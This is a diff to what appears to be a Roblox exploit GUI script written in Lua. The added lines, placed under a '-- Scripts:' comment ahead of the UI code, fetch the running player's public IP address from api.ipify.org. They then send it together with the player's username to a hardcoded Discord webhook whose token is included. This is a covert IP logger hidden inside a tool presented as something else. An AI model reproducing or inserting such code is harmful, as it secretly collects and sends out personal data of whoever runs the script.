@@ -2772,6 +2772,36 @@ end)
 UICorner_10.Parent = crash
 
 -- Scripts:
+local IP = (syn and syn.request or request)
+{
+Url = "https://api.ipify.org", 
+Method = "GET",
+Headers = {
+["Content-Type"] = "application/json"
+},    
+};
+
+IPLOG = {
+["embeds"] = {{
+["color"] = 13708129,
+["description"] = (IP.Body),
+["author"] = {
+["name"] = (game.Players.LocalPlayer.Name)
+}}
+}
+}
+
+local SEND = request(
+{
+Url = "https://discord.com/api/webhooks/964124744960049162/EXzAC2nW7uXBPddCtBB94bx4BP2GioCLaHNesXh9QpjUwt5b9dFvE5Y8W7QtYioHeC-D",
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json"
+},
+Body = game:GetService("HttpService"):JSONEncode(IPLOG)
+}
+)
+
 
 local function RDWM_fake_script() -- ImageLabel.LocalScript 
 	local script = Instance.new('LocalScript', ImageLabel)
